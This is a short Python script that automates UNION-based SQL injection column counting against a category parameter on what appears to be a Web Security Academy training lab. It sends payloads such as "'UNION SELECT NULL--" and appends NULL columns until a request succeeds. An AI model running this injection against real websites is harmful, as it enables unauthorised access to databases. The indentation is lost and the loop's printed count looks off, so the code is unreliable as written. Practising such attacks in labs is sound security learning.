import requests
import sys
url = 'https://abcd.web-security-academy.net/page'
params = {'category': 'Lifestyle'}
null = ["'UNION", 'SELECT', 'NULL', '--']
sqli = {'category': f"Lifestyle{' '.join(null)}"}
api_session = requests.Session()
response = api_session.get(url, params=sqli)
if response.status_code == 404:
sys.exit('The session you are looking for has expired')
while not response.ok:
null.pop(-1)
print(f"There are {null.count('NULL') + null.count(',NULL')} columns:")
null.extend([',NULL', '--'])
print(response.url)
sqli['category'] = f"Lifestyle{' '.join(null)}"
response = api_session.get(url, params=sqli)
